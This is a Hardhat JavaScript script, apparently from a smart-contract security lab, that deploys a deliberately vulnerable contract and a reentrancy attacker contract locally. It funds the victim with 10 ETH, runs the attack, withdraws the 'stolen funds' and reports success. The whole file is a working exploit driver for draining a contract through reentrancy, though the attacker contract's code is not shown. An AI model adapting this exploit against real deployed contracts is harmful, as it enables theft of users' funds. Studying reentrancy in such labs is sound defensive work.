const { ethers } = require("hardhat");

async function main() {
  console.log("🚀 Initiating attack on SC05_Reentrancy_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();
  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACTS ---
  console.log("\n📦 Deploying contracts...");
  
  // Deploy the vulnerable contract
  const VulnerableContract = await ethers.getContractFactory(
    "SC05_Reentrancy_Vulnerable"
  );
  const vulnerable = await VulnerableContract.deploy();
  await vulnerable.waitForDeployment();
  console.log(`SC05_Reentrancy_Vulnerable deployed at: ${vulnerable.target}`);

  // Deploy the attacker contract
  const AttackerContract = await ethers.getContractFactory(
    "SC05_ReentrancyAttacker"
  );
  const attackerContract = await AttackerContract.deploy(vulnerable.target);
  await attackerContract.waitForDeployment();
  console.log(`SC05_ReentrancyAttacker deployed at: ${attackerContract.target}`);

  // --- 3. FUND THE VICTIM CONTRACT ---
  console.log("\n💰 Funding the vulnerable contract with 10 ETH from deployer...");
  const fundTx = await vulnerable.connect(deployer).deposit({
    value: ethers.parseEther("10.0"),
  });
  await fundTx.wait();
  console.log("✅ Funding successful!");

  // --- 4. CHECK BALANCES BEFORE ATTACK ---
  console.log("\n💰 Checking balances before attack...");
  const contractBalanceBefore = await ethers.provider.getBalance(
    vulnerable.target
  );
  const deployerBalance = await vulnerable.getBalance(deployer.address);
  const attackerContractBalance = await vulnerable.getBalance(
    attackerContract.target
  );

  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalanceBefore)} ETH`);
  console.log(`   - Deployer's Balance in Contract: ${ethers.formatEther(deployerBalance)} ETH`);
  console.log(`   - Attacker's Balance in Contract: ${ethers.formatEther(attackerContractBalance)} ETH`);

  // --- 5. EXECUTE THE REENTRANCY ATTACK ---
  console.log("\n💥 ATTACKING: Initiating reentrancy attack...");
  const attackTx = await attackerContract
    .connect(attacker)
    .attack({ value: ethers.parseEther("1.0") });
  await attackTx.wait();
  console.log("✅ Attack transaction successful!");

  // Get attack count
  const stats = await attackerContract.getStats();
  console.log(`   - Reentrancy attempts: ${stats.attempts}`);
  console.log(`   - Total ETH received: ${ethers.formatEther(stats.received)} ETH`);

  // --- 6. WITHDRAW STOLEN FUNDS ---
  console.log("\n🎁 Attacker withdrawing stolen funds...");
  try {
    const withdrawTx = await attackerContract.connect(attacker).withdraw();
    await withdrawTx.wait();
    console.log("✅ Withdrawal successful!");
  } catch (error) {
    console.log("❌ Withdrawal failed (funds in attacker contract)");
  }

  // --- 7. CHECK BALANCES AFTER ATTACK ---
  console.log("\n💰 Checking balances after attack...");
  const contractBalanceAfter = await ethers.provider.getBalance(
    vulnerable.target
  );
  const deployerBalanceAfter = await vulnerable.getBalance(deployer.address);
  const attackerBalanceAfter = await vulnerable.getBalance(
    attackerContract.target
  );
  const attackerETHBalance = await ethers.provider.getBalance(
    attacker.address
  );

  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalanceAfter)} ETH`);
  console.log(`   - Deployer's Balance in Contract: ${ethers.formatEther(deployerBalanceAfter)} ETH`);
  console.log(`   - Attacker's Balance in Contract: ${ethers.formatEther(attackerBalanceAfter)} ETH`);
  console.log(`   - Attacker's ETH Balance: ${ethers.formatEther(attackerETHBalance)} ETH`);

  // --- 8. DETERMINE SUCCESS ---
  console.log("\n" + "=".repeat(60));
  
  // Check if attacker's contract received ETH (not their balance in vulnerable contract, but their actual ETH)
  const attackerContractETHBalance = await ethers.provider.getBalance(attackerContract.target);
  
  if (attackerContractETHBalance > 0n) {
    console.log(
      "🎉 SUCCESS: Reentrancy attack successful!"
    );
    console.log(`   - Attacker contract received: ${ethers.formatEther(attackerContractETHBalance)} ETH`);
    console.log(`   - This ETH was withdrawn during reentrancy`);
    console.log(`   - Deposited: 1 ETH, Received: ${ethers.formatEther(attackerContractETHBalance)} ETH`);
  } else {
    console.log("😞 FAILED: Reentrancy attack did not succeed.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
